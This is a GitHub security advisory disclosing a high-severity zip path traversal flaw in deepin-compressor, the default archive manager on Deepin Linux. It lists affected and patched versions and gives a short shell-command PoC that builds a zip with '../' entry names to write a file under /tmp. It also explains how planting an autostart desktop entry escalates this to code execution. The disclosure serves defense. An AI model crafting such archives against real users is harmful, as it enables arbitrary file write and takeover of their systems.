# Zip Path Traversal in Deepin-Compressor

High

[BLumia](/BLumia)
published
GHSA-rw5r-8p9h-3gp2
Dec 26, 2023

## Package

deepin-compressor

## Affected versions

< 5.12.21

## Patched versions

5.12.21

## Description

### Summary

Deepin-Compressor is the default archive manager of Deepin Linux OS. There's a path traversal vulnerability in deepin-compressor that can be exploited to achieve Remote Command Execution on the target system upon opening crafted archives.

### Details

While decompressing/extracting zip archives, deepin-compressor is not validating the file names. By adding one or more "../" as prefixes to the filenames will lead to path traversal. This leads to arbitrary file write and RCE.

### PoC

Steps to create such zip archive:

1. Create a file for traversal

```
echo "TEST" > XXYXXYXXYtmpYpoc.txt

```

2. Make a normal zip archive

```
zip poc.zip XXYXXYXXYtmpYpoc.txt

```

3. Craft malicious archive

```
sed -i s/"XXY"/"..\/"/g poc.zip
sed -i s/"tmpY"/"tmp\/"/g poc.zip

```

By following the above steps, you can create a malicious zip archive, upon extracting that archive, a file named poc.txt will e created under /tmp directory

### Impact

Remote Command Execution: By exploiting the vulnerability an attacker can place malicious desktop entries under ~/.config/autostart to achieve RCE on the target.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
